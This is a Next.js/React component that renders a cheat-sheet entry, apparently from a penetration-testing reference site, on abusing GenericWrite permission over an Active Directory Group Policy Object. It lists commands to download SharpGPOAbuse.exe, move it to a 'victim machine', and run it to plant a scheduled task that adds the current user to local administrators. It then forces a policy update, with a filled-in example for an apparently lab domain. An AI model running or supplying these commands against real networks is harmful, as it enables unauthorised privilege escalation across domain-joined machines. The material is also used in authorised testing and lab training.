import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const GenericWriteOnGPO = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              In this situation we have{" "}
              <Typography display="inline" className="highlight">
                GenericWrite
              </Typography>{" "}
              permission on a{" "}
              <Typography display="inline" className="highlight">
                GPO
              </Typography>
              .
            </Typography>
            <Image src="/gpo.png" width={465} height={178} priority={true} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Download{" "}
              <Typography display="inline" className="highlight">
                SharpGPOAbuse.exe
              </Typography>
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Transfer{" "}
              <Typography display="inline" className="highlight">
                SharpGPOAbuse.exe
              </Typography>{" "}
              to victim machine.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                '.\\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author {DOMAIN}\\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators {CURRENT_USER} /add" --GPOName "{GPO_NAME}"'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Box sx={{ m: 2 }} />
            <Typography>Example</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                '.\\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>If you can, update the group policy.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"gpupdate /force"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default GenericWriteOnGPO;
